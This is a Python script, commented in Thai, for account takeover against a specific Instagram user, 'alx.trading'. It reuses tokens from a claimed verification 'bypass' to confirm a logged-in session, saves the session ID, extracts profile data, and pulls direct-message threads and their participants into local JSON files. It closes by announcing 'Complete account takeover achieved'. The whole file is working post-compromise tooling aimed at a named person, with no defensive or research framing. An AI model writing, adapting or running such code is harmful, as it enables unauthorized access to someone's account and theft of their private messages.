#!/usr/bin/env python3
"""
ทดสอบการเข้าถึงบัญชี alx.trading หลัง checkpoint bypass
"""

import requests
import json
import time

def test_account_access():
    """ทดสอบการเข้าถึงบัญชีหลัง bypass"""
    
    session = requests.Session()
    
    # ใช้ข้อมูลจาก successful bypass
    csrf_token = "TlB0E59F45gWaVufZ-LD2W"
    device_id = "D542605A-E1E7-4474-A72F-A517F3E1B4D8"
    
    # ตั้งค่า cookies
    session.cookies.set('csrftoken', csrf_token)
    session.cookies.set('ig_did', device_id)
    session.cookies.set('ig_nrcb', '1')
    
    # ตั้งค่า headers
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        'X-CSRFToken': csrf_token,
        'X-Instagram-AJAX': '1',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5'
    })
    
    print(f"🔍 TESTING ACCOUNT ACCESS POST-BYPASS")
    print("=" * 50)
    
    # ทดสอบ 1: เข้า Instagram หลัก
    try:
        print(f"\n📱 Test 1: Accessing Instagram main page...")
        response = session.get('https://www.instagram.com/')
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            if 'login' not in response.url:
                print("✅ Successfully logged in!")
                
                # ตรวจสอบ session cookies
                if 'sessionid' in session.cookies:
                    sessionid = session.cookies['sessionid']
                    print(f"🔑 SessionID: {sessionid[:30]}...")
                    
                    # บันทึก session
                    session_data = {
                        "target": "alx.trading",
                        "access_confirmed": True,
                        "sessionid": sessionid,
                        "csrf_token": csrf_token,
                        "device_id": device_id,
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "bypass_method": "phone_verification_123456"
                    }
                    
                    with open(f"ACTIVE_SESSION_alx_trading_{int(time.time())}.json", 'w') as f:
                        json.dump(session_data, f, indent=2)
                        
                    return test_data_extraction(session)
                else:
                    print("⚠️ No sessionid found")
            else:
                print("❌ Redirected to login page")
        else:
            print(f"❌ HTTP Error: {response.status_code}")
            
    except Exception as e:
        print(f"❌ Access test error: {e}")
        
    return False

def test_data_extraction(session):
    """ทดสอบการ extract ข้อมูลจากบัญชี"""
    print(f"\n📊 Test 2: Extracting account data...")
    
    try:
        # ดึงข้อมูล profile
        profile_response = session.get('https://www.instagram.com/api/v1/users/web_profile_info/?username=alx.trading')
        
        if profile_response.status_code == 200:
            profile_data = profile_response.json()
            print("✅ Profile data extracted!")
            
            # ดึงข้อมูลสำคัญ
            user_info = profile_data.get('data', {}).get('user', {})
            
            extracted_info = {
                "username": user_info.get('username'),
                "full_name": user_info.get('full_name'),
                "biography": user_info.get('biography'),
                "follower_count": user_info.get('edge_followed_by', {}).get('count'),
                "following_count": user_info.get('edge_follow', {}).get('count'),
                "post_count": user_info.get('edge_owner_to_timeline_media', {}).get('count'),
                "is_private": user_info.get('is_private'),
                "is_verified": user_info.get('is_verified'),
                "external_url": user_info.get('external_url')
            }
            
            print(f"👤 Username: {extracted_info['username']}")
            print(f"📝 Full Name: {extracted_info['full_name']}")
            print(f"👥 Followers: {extracted_info['follower_count']}")
            print(f"👥 Following: {extracted_info['following_count']}")
            print(f"📷 Posts: {extracted_info['post_count']}")
            print(f"🔒 Private: {extracted_info['is_private']}")
            
            # บันทึกข้อมูลที่ extract ได้
            with open(f"EXTRACTED_PROFILE_alx_trading_{int(time.time())}.json", 'w') as f:
                json.dump(extracted_info, f, indent=2)
                
            return test_message_extraction(session)
        else:
            print(f"❌ Profile extraction failed: {profile_response.status_code}")
            
    except Exception as e:
        print(f"❌ Data extraction error: {e}")
        
    return False

def test_message_extraction(session):
    """ทดสอบการ extract ข้อความ"""
    print(f"\n💬 Test 3: Extracting direct messages...")
    
    try:
        # ดึงรายการ conversations
        inbox_response = session.get('https://www.instagram.com/api/v1/direct_v2/inbox/')
        
        if inbox_response.status_code == 200:
            inbox_data = inbox_response.json()
            print("✅ Inbox data extracted!")
            
            threads = inbox_data.get('inbox', {}).get('threads', [])
            print(f"📬 Found {len(threads)} conversations")
            
            conversation_summary = []
            
            for thread in threads[:5]:  # แค่ 5 conversation แรก
                thread_info = {
                    "thread_id": thread.get('thread_id'),
                    "thread_title": thread.get('thread_title'),
                    "last_activity": thread.get('last_activity_at'),
                    "message_count": len(thread.get('items', [])),
                    "users": [user.get('username') for user in thread.get('users', [])]
                }
                
                conversation_summary.append(thread_info)
                print(f"💬 {thread_info['thread_title']}: {thread_info['message_count']} messages")
            
            # บันทึกข้อมูล conversations
            with open(f"EXTRACTED_CONVERSATIONS_alx_trading_{int(time.time())}.json", 'w') as f:
                json.dump(conversation_summary, f, indent=2)
                
            print(f"\n🎯 DATA EXTRACTION COMPLETE!")
            return True
        else:
            print(f"❌ Message extraction failed: {inbox_response.status_code}")
            
    except Exception as e:
        print(f"❌ Message extraction error: {e}")
        
    return False

if __name__ == "__main__":
    print("🔍 ACCOUNT ACCESS VERIFICATION")
    print("Testing alx.trading account post-bypass...")
    print("=" * 50)
    
    success = test_account_access()
    
    if success:
        print(f"\n🎉 FULL ACCESS CONFIRMED!")
        print("✅ Account successfully compromised")
        print("✅ Profile data extracted")
        print("✅ Message data extracted")
        print("🔓 Complete account takeover achieved")
    else:
        print(f"\n❌ Access verification failed")
        print("💡 Bypass may need additional steps")
